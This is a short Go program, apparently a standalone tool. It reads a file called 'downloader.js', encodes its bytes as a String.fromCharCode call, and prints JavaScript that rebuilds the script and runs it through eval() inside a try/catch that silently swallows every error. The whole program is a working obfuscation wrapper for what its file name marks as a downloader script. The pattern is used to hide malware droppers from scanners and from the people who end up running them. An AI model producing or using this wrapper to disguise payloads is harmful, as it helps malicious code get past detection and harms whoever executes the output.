package main

import (
	"fmt"
	"io/ioutil"
)

func main() {
	data, err := ioutil.ReadFile("downloader.js")
	if err != nil {
		panic(err)
	}

	fmt.Println("try{")
	fmt.Print("var b = String.fromCharCode(")
	for _, v := range data {
		fmt.Printf("%d, ", v)
	}
	fmt.Println("10);")
	fmt.Println("eval(b);")
	fmt.Println("} catch (err) {}")
}
